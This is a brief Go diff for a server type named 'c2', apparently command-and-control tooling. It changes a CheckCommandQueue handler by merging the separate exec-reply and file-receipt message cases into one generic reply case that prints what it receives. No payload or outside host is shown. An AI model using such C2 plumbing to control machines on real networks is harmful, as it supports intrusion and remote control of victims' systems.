@@ -19,10 +19,8 @@ type c2 struct {
 func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
 	switch u := req.Message.(type) {
 	case *pb.CheckCmdRequest_Heartbeat:
-	case *pb.CheckCmdRequest_Exec:
-		fmt.Println("Exec reply", u)
-	case *pb.CheckCmdRequest_File:
-		fmt.Println("Received file", u)
+	case *pb.CheckCmdRequest_Reply:
+		fmt.Println("Reply", u)
 	default:
 		common.Panic("Didn't receive a valid message", req, u)
 	}
